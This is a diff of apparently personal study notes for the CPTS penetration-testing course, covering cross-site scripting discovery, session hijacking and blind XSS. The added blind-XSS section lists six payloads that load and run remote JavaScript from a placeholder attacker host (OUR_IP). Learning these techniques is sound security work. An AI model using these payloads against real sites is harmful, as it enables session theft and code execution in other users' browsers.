@@ -41,7 +41,7 @@ To automate discovery of XSS, we can use a variety of tools to aid us in the pro
 python xsstrike.py -u "<url>" 
 ```
 
-*Due to scope of CPTS, defacing and phishing will be intentionally skipped*
+*Due to nature of CPTS, defacing and phishing will be intentionally skipped*
 
 Session Hijacking:
 
@@ -49,4 +49,13 @@ Modern webapp usually utilize cookies to maintain a user's session with the serv
 
 Blind XSS vulnerability:
 
-Blind XSS Vulnerability refers to a xss vulnerability that is triggered on a page we dont have access to, usually this can be exploited if we are able to pass along some data to interact with that certain page we do not have access toi (example: a registration approval page that populate registration details for admin to approval, notice that the details are entered by us)
+Blind XSS Vulnerability refers to a xss vulnerability that is triggered on a page we dont have access to, usually this can be exploited if we are able to pass along some data to interact with that certain page we do not have access toi (example: a registration approval page that populate registration details for admin to approval, notice that the details are entered by us), we can open a server up and setup xss payload to determine which fields of entry have a XSS Vulnerability, we can refer to following list of common payload, for more payload, refer to https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss:
+
+```
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
